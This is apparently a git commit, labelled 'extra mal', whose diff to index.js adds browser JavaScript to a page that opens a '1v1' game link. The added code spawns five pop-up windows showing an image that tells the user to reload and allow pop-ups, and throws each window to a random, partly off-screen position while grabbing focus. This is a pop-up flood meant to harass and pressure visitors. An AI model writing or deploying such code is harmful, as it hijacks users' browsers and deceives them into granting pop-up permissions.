3d27771f2a2537bc06f464f2d06884e048001d13
StaidChannel708 <66675378+StaidChannel708@users.noreply.github.com>
2022-03-08 15:07:26 +0000

    extra mal

--- index.js
+++ index.js
@@ -1,3 +1,40 @@
+rand = function(min, max) {
+    if (min==null && max==null)
+      return 0;    
+    
+    if (max == null) {
+        max = min;
+        min = 0;
+      }
+      return min + Math.floor(Math.random() * (max - min + 1));
+};
+
+
+
 var url =  'https://staidchannel708.github.io/1v1/';
+
 window.open(url, '_blank');
-window.open(url, '_blank', "toolbar=yes,scrollbars=yes,resizable=yes,top=500,left=500,width=400,height=400");
+url = ("ReloadTabAndAllowPopUps.png");
+jeff = window.open(url, '_blank', "toolbar=yes,scrollbars=yes,resizable=yes,top=500,left=500,width=400,height=400");
+jeff.moveTo(rand(-2000, 2000), rand(-5000, 5000));
+jeff.focus();
+jeff = window.open(url, '_blank', "toolbar=yes,scrollbars=yes,resizable=yes,top=500,left=500,width=400,height=400");
+jeff.moveTo(rand(-2000, 2000), rand(-5000, 5000));
+jeff.focus();
+jeff = window.open(url, '_blank', "toolbar=yes,scrollbars=yes,resizable=yes,top=500,left=500,width=400,height=400");
+jeff.moveTo(rand(-2000, 2000), rand(-5000, 5000));
+jeff.focus();
+jeff = window.open(url, '_blank', "toolbar=yes,scrollbars=yes,resizable=yes,top=500,left=500,width=400,height=400");
+jeff.moveTo(rand(-2000, 2000), rand(-5000, 5000));
+jeff.focus();
+jeff = window.open(url, '_blank', "toolbar=yes,scrollbars=yes,resizable=yes,top=500,left=500,width=400,height=400");
+jeff.moveTo(rand(-2000, 2000), rand(-5000, 5000));
+jeff.focus();
+var screenx = screenx;
+var screeny = screeny;
+
+
+jeff.focus();
+
+
+
